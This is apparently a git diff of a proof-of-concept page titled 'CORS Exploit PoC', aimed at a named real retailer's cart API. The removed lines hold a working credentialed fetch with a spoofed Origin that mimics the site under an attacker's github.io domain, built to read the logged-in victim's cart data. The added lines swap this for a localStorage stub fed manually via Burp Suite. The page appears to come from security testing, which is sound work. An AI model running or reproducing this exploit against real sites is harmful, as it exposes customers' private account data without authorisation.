@@ -7,29 +7,30 @@
 </head>
 <body>
     <h1>CORS Exploit PoC</h1>
-    <p id="output">Fetching data...</p>
+    <p id="output">Waiting for request...</p>
     <script>
-        // Fetch API to test CORS with a manipulated Origin
-        fetch("https://www.marionnaud.cz/api/v2/mcz/users/current/carts/current?fields=FULL&stocks=1&country=CZ&lang=cs_CZ", {
-            method: "GET",
-            credentials: "include",
-            headers: {
-                "Origin": "https://www.marionnaud.cz.stargazer0.github.io"
-            }
-        })
-        .then(response => {
-            if (response.ok) {
-                return response.text();
-            } else {
-                throw new Error(`CORS request failed with status: ${response.status}`);
-            }
-        })
-        .then(data => {
-            document.getElementById("output").textContent = `Data received: ${data}`;
-        })
-        .catch(error => {
-            document.getElementById("output").textContent = `Error: ${error.message}`;
-        });
+        // Check if data is already stored in localStorage
+        const storedData = localStorage.getItem('corsData');
+        const outputElement = document.getElementById("output");
+
+        if (storedData) {
+            // If data exists, display it
+            outputElement.textContent = `Stored Data: ${storedData}`;
+        } else {
+            // If no data exists, wait for manual request to be sent via Burp Suite
+            outputElement.textContent = "Waiting for Burp Suite request...";
+        }
+
+        // Function to save and display data when Burp Suite request is captured
+        function saveData(data) {
+            localStorage.setItem('corsData', data);
+            outputElement.textContent = `Data received: ${data}`;
+        }
+
+        // This function can be triggered manually in the browser console after Burp Suite intercept
+        window.displayBurpData = function(responseText) {
+            saveData(responseText);
+        };
     </script>
 </body>
 </html>
